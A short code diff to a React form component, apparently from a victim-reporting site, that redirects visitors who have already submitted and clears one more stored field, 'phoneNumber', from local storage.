@@ -45,6 +45,17 @@ const First = () => {
         console.log(vistorData);
 
         if (vistorData.resp.error_code === "0") {
+          if (vistorData.resp.submitted === 1)  {
+            Cookies.set("visitor_id", vistorData.resp.visitor_id, {
+              path: "/",
+              sameSite: "Strict",
+              expires: 7,
+            });
+            navigate("/submited", {
+              replace: true,
+              state: { visitorData: vistorData },
+            });
+          }
           if (vistorData.resp.visitor_id === vist_id) {
             setVisitorID(vistorData.resp.visitor_id);
             if (vistorData.resp.sess_sts !== 0) {
@@ -158,6 +169,7 @@ const First = () => {
               "bankForms",
               "radio",
               "victimGender",
+              "phoneNumber"
             ];
 
             // Loop through the keys and remove them from localStorage
